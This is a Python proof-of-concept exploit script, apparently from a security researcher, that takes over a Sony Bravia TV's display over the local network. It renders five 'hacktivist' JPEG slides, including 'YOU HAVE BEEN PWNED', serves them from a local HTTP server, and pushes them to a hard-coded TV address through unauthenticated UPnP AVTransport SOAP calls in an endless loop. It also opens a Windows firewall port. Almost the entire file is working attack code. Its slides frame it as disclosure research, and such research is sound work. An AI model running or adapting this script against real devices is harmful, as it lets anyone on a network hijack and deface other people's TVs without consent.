#!/usr/bin/env python3
"""
Slideshow attack: cycle through hacktivist JPEG slides on the TV indefinitely.
Each slide is served as a JPEG image via UPnP AVTransport injection.
Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""
import os, tempfile, time, threading, json, datetime, re, sys
import http.server, socketserver
import numpy as np
import requests
from PIL import Image, ImageDraw, ImageFont

_tmp = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                    "..", "..", "..", "..", "..", ".tmp")
os.makedirs(_tmp, exist_ok=True)
tempfile.tempdir = _tmp

TARGET   = "192.168.18.6"
ATTACKER = "192.168.18.147"
PORT     = 9999
UPNP     = 2870
OUT_DIR  = os.path.dirname(os.path.abspath(__file__))

HITS     = []
LOG      = []

W, H = 1920, 1080

SLIDES_DEF = [
    {
        "name": "slide_01_pwned.jpg",
        "bg": (10, 10, 10),
        "lines": [
            ("YOU HAVE BEEN PWNED", (255, 20, 20), 0.18, 110),
            ("Sony Bravia KDL-50W665F", (220, 220, 220), 0.36, 56),
            ("Firmware: v7.631-4.000-0106", (180, 180, 180), 0.46, 40),
            ("IP: 192.168.18.6  MAC: CC:98:8B:D2:80:C8", (150, 150, 150), 0.54, 34),
            ("[!] No Authentication Required on UPnP Port 2870", (255, 165, 0), 0.66, 36),
            ("Researcher: @mrhenrike | Uniao Geek", (80, 200, 120), 0.80, 34),
        ],
    },
    {
        "name": "slide_02_vulns.jpg",
        "bg": (0, 0, 25),
        "lines": [
            ("VULNERABILITIES CONFIRMED", (255, 80, 0), 0.14, 80),
            ("BRAVIA-2026-001  Unauthenticated DLNA Control   CVSSv3: 8.1 HIGH", (255, 200, 0), 0.30, 36),
            ("BRAVIA-2026-002  Information Disclosure via UPnP CVSSv3: 5.3 MED",  (255, 200, 0), 0.40, 36),
            ("BRAVIA-2026-003  SSRF via AVTransport URI Inject CVSSv3: 7.4 HIGH", (255, 200, 0), 0.50, 36),
            ("BRAVIA-2026-004  Unauthenticated App Launch/Kill CVSSv3: 6.5 MED",  (255, 200, 0), 0.60, 36),
            ("Responsible Disclosure Submitted to Sony PSIRT", (100, 200, 255), 0.75, 40),
            ("Embargo: 90 days from 2026-04-20", (150, 150, 255), 0.86, 32),
        ],
    },
    {
        "name": "slide_03_impact.jpg",
        "bg": (15, 0, 0),
        "lines": [
            ("ATTACK SURFACE", (255, 60, 60), 0.13, 80),
            ("- Remote control of all UPnP apps without authentication", (220, 100, 100), 0.27, 36),
            ("- Arbitrary media injection from attacker HTTP server",    (220, 100, 100), 0.36, 36),
            ("- Server-Side Request Forgery to internal LAN hosts",     (220, 100, 100), 0.45, 36),
            ("- Device state exfiltration (volume, transport, media)",  (220, 100, 100), 0.54, 36),
            ("- Active even in STANDBY mode (port 2870 always open)",   (255,  50,  50), 0.64, 36),
            ("Lateral target found: 192.168.18.193 (same DIAL port)", (255, 200, 0), 0.76, 34),
            ("This PoC runs silently from any device on the LAN", (200, 200, 200), 0.87, 30),
        ],
    },
    {
        "name": "slide_04_poc.jpg",
        "bg": (0, 15, 0),
        "lines": [
            ("PROOF OF CONCEPT", (0, 255, 0), 0.13, 80),
            ("1. SSRF confirmed: TV sent HEAD to 192.168.18.147:9999", (180, 255, 180), 0.27, 36),
            ("2. Image injection: TV downloaded 202KB JPEG (this image!)", (180, 255, 180), 0.36, 36),
            ("3. DIAL takeover: Netflix launched HTTP 201, stopped HTTP 200", (180, 255, 180), 0.45, 36),
            ("4. Volume control: SetVolume=3 HTTP 200 (unauthenticated)", (180, 255, 180), 0.54, 36),
            ("5. Transport state: PLAYING / TRANSITIONING confirmed", (180, 255, 180), 0.63, 36),
            ("All evidence: reports/sony_bravia_kdl50w665f/live_exploit/", (100, 200, 100), 0.75, 32),
            ("Tool: EmbedXPL-Forge — github.com/Uniao-Geek", (80, 180, 80), 0.86, 30),
        ],
    },
    {
        "name": "slide_05_goodbye.jpg",
        "bg": (10, 10, 30),
        "lines": [
            ("THIS IS A SECURITY RESEARCH TEST", (100, 150, 255), 0.14, 72),
            ("No personal data was exfiltrated.", (200, 220, 255), 0.30, 48),
            ("Your Sony Bravia is vulnerable to remote exploitation", (220, 200, 255), 0.42, 40),
            ("from any device on the same local network.", (220, 200, 255), 0.52, 40),
            ("Please apply Sony firmware updates when available.", (255, 220, 100), 0.65, 40),
            ("Contact: security@sony.com | CVE via CERT/VINCE", (150, 200, 255), 0.77, 34),
            ("@mrhenrike | Uniao Geek Security Research 2026", (120, 120, 200), 0.88, 30),
        ],
    },
]


def make_slide(defn: dict) -> str:
    path = os.path.join(OUT_DIR, defn["name"])
    img = Image.new("RGB", (W, H), defn["bg"])
    draw = ImageDraw.Draw(img)
    for txt, color, y_frac, size in defn["lines"]:
        try:
            font = ImageFont.truetype("arial.ttf", size)
        except Exception:
            font = ImageFont.load_default()
        try:
            bbox = draw.textbbox((0, 0), txt, font=font)
            tw = bbox[2] - bbox[0]
        except Exception:
            tw = len(txt) * (size // 2)
        x = max(0, (W - tw) // 2)
        y = int(H * y_frac)
        draw.text((x + 3, y + 3), txt, fill=(0, 0, 0), font=font)
        draw.text((x, y), txt, fill=color, font=font)
    img.save(path, "JPEG", quality=95)
    return path


def soap(svc, action, inner, path):
    body = (
        '<?xml version="1.0" encoding="utf-8"?>'
        '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
        's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
        f"<s:Body><u:{action} xmlns:u=\"{svc}\">{inner}</u:{action}></s:Body>"
        "</s:Envelope>"
    )
    headers = {
        "Content-Type": 'text/xml; charset="utf-8"',
        "SOAPACTION": f'"{svc}#{action}"',
    }
    return requests.post(f"http://{TARGET}:{UPNP}/{path}",
                         data=body.encode(), headers=headers, timeout=8)


SLIDE_DATA = {}  # name -> bytes


class SlideHandler(http.server.BaseHTTPRequestHandler):
    def do_HEAD(self):
        key = self.path.lstrip("/")
        self._log("HEAD", key)
        if key in SLIDE_DATA:
            self.send_response(200)
            self.send_header("Content-Type", "image/jpeg")
            self.send_header("Content-Length", str(len(SLIDE_DATA[key])))
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        key = self.path.lstrip("/")
        self._log("GET", key)
        if key in SLIDE_DATA:
            data = SLIDE_DATA[key]
            self.send_response(200)
            self.send_header("Content-Type", "image/jpeg")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        else:
            self.send_response(404)
            self.end_headers()

    def _log(self, method, key):
        h = {"time": datetime.datetime.now(datetime.timezone.utc).isoformat(),
             "method": method, "path": self.path, "peer": self.client_address[0],
             "ua": self.headers.get("User-Agent", "")}
        HITS.append(h)
        print(f"  *** {method} /{key} from {h['peer']}  size={len(SLIDE_DATA.get(key,b'')//1 if isinstance(SLIDE_DATA.get(key), (bytes, bytearray)) else 0)//1024}KB",
              flush=True)

    def log_message(self, *args):
        pass


def get_state():
    r = soap("urn:schemas-upnp-org:service:AVTransport:1",
             "GetTransportInfo", "<InstanceID>0</InstanceID>", "control/AVTransport")
    m = re.search(r"<CurrentTransportState>([^<]+)</CurrentTransportState>", r.text)
    return m.group(1) if m else "?"


def inject_slide(slide_name: str):
    AVT = "urn:schemas-upnp-org:service:AVTransport:1"
    uri = f"http://{ATTACKER}:{PORT}/{slide_name}"
    r1 = soap(AVT, "SetAVTransportURI",
              f"<InstanceID>0</InstanceID><CurrentURI>{uri}</CurrentURI>"
              "<CurrentURIMetaData></CurrentURIMetaData>",
              "control/AVTransport")
    r2 = soap(AVT, "Play", "<InstanceID>0</InstanceID><Speed>1</Speed>",
              "control/AVTransport")
    return r1.status_code, r2.status_code


def main():
    cycles = int(sys.argv[1]) if len(sys.argv) > 1 else 3

    # Generate slides
    print("[*] Generating slides...")
    slide_names = []
    for defn in SLIDES_DEF:
        path = make_slide(defn)
        with open(path, "rb") as f:
            SLIDE_DATA[defn["name"]] = f.read()
        slide_names.append(defn["name"])
        print(f"  {defn['name']}: {len(SLIDE_DATA[defn['name']])//1024} KB")

    # Firewall + server
    os.system('netsh advfirewall firewall add rule name="PoC_Slides_9999" dir=in action=allow protocol=TCP localport=9999 >nul 2>&1')
    srv = socketserver.TCPServer(("", PORT), SlideHandler)
    srv.allow_reuse_address = True
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print(f"\n[*] Server on {ATTACKER}:{PORT}")
    print(f"[*] Starting slideshow — {len(slide_names)} slides x {cycles} cycles")
    print("[*] Press Ctrl+C to stop early\n")

    results = []
    t0 = time.time()
    try:
        for cycle in range(cycles):
            for i, name in enumerate(slide_names):
                hits_before = len(HITS)
                set_c, play_c = inject_slide(name)
                time.sleep(6)  # Display each slide for ~6s
                state = get_state()
                new_hits = HITS[hits_before:]
                downloaded = any(h["method"] == "GET" for h in new_hits)
                result = {
                    "cycle": cycle+1, "slide": name,
                    "set_http": set_c, "play_http": play_c,
                    "state": state, "downloaded": downloaded,
                    "hits": new_hits,
                }
                results.append(result)
                sym = "DISPLAYED" if downloaded else ("PLAYING" if state in ("PLAYING","TRANSITIONING") else "FAILED")
                elapsed = int(time.time() - t0)
                print(f"  [cycle {cycle+1}/{cycles}] [{elapsed:3d}s] [{sym}] {name}: "
                      f"play={play_c} state={state} hits={len(new_hits)}")
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")

    srv.shutdown()
    os.system('netsh advfirewall firewall delete rule name="PoC_Slides_9999" >nul 2>&1')

    evidence = {
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "total_slides_injected": len(results),
        "successful_displays": sum(1 for r in results if r["downloaded"]),
        "all_hits": HITS,
        "results": results,
    }
    out = os.path.join(OUT_DIR, "slideshow_evidence.json")
    with open(out, "w") as f:
        json.dump(evidence, f, indent=2)

    print(f"\n=== SLIDESHOW COMPLETE ===")
    print(f"  Injections: {len(results)}")
    print(f"  Successful downloads: {sum(1 for r in results if r['downloaded'])}")
    print(f"  Total TV requests: {len(HITS)}")
    print(f"  Evidence -> {out}")


if __name__ == "__main__":
    main()
